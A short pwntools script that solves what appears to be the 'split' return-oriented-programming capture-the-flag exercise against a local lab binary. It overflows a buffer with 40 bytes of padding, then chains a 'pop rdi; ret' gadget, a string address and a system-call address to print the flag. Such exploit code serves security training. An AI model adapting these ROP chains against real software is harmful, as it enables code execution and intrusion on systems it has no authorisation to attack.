from pwn import *

e = ELF('./split')
p = e.process()

print(p.recv().decode())

# raw_input('attach gdb')

# padding to overwrite data
padding = b'A' * 40

# return to `pop rdi; ret` gadget
gadget = p64(0x400883)

# desired string's address
str_add = p64(0x601060)

# address of system call instruction
addr = p64(0x400810)

payload = padding
payload += gadget
payload += str_add
payload += addr

p.sendline(payload)

flag = p.recvline().decode()
success("Found the flag: " + flag)
